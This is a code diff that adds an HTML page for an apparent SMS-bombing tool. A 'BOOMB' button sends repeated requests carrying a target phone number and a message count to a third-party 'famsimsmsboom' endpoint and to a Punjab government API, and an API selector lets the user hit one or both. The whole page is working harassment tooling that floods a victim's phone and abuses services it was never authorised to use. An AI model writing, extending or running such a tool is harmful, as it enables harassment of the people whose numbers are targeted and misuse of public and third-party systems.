@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <!-- All previous head content remains unchanged -->
+    <style>
+        /* All previous CSS remains unchanged */
+        .api-group {
+            margin-bottom: 20px;
+            padding: 15px;
+            border: 2px solid #444;
+            border-radius: 8px;
+        }
+        
+        .api-selector {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        
+        .api-option {
+            flex: 1;
+            padding: 10px;
+            border: 2px solid #f00;
+            border-radius: 5px;
+            cursor: pointer;
+            text-align: center;
+            transition: all 0.3s;
+        }
+        
+        .api-option.selected {
+            background: #f00;
+            color: #fff;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Previous container content remains unchanged -->
+        
+        <div class="api-group">
+            <div class="api-selector">
+                <div class="api-option selected" data-api="original">Original API</div>
+                <div class="api-option" data-api="punjab">Punjab API</div>
+                <div class="api-option" data-api="both">Both APIs</div>
+            </div>
+            <div id="api-status"></div>
+        </div>
+
+        <!-- Rest of the previous HTML remains unchanged -->
+
+    </div>
+
+    <script>
+        // Previous JavaScript remains unchanged until the API section
+
+        // API Configuration
+        const apis = {
+            original: 'https://fam-official.serv00.net/sim/famsimsmsboom.php',
+            punjab: 'https://e-epd.punjab.gov.pk/api'
+        };
+
+        // API Selection Logic
+        let selectedAPI = 'both';
+        document.querySelectorAll('.api-option').forEach(option => {
+            option.addEventListener('click', function() {
+                document.querySelectorAll('.api-option').forEach(opt => opt.classList.remove('selected'));
+                this.classList.add('selected');
+                selectedAPI = this.dataset.api;
+            });
+        });
+
+        // Modified BOOMB button handler
+        boomBtn.addEventListener('click', async function() {
+            // Previous validation remains unchanged
+
+            // Get targets based on selection
+            const targets = [];
+            if (selectedAPI === 'original' || selectedAPI === 'both') targets.push(apis.original);
+            if (selectedAPI === 'punjab' || selectedAPI === 'both') targets.push(apis.punjab);
+
+            // Send requests
+            boomBtn.disabled = true;
+            boomBtn.textContent = 'BOOMING...';
+            const statusElement = document.getElementById('api-status');
+            statusElement.innerHTML = '';
+
+            try {
+                const responses = await Promise.allSettled(
+                    targets.map(url => 
+                        fetch(`${url}?number=${number}&amount=${amount}`)
+                            .then(response => response.text())
+                    )
+                );
+
+                let successCount = 0;
+                responses.forEach((result, index) => {
+                    const status = document.createElement('div');
+                    status.style.color = result.status === 'fulfilled' ? '#0f0' : '#f00';
+                    status.textContent = `${targets[index]}: ${
+                        result.status === 'fulfilled' 
+                        ? `Success: ${result.value}`
+                        : `Error: ${result.reason}`
+                    }`;
+                    statusElement.appendChild(status);
+                    
+                    if (result.status === 'fulfilled') successCount++;
+                });
+
+                alert(`${successCount}/${targets.length} APIs succeeded! Check status below.`);
+            } catch (error) {
+                alert(`Error: ${error.message}`);
+            } finally {
+                boomBtn.disabled = false;
+                boomBtn.textContent = 'BOOMB💣';
+            }
+        });
+    </script>
+</body>
+</html>
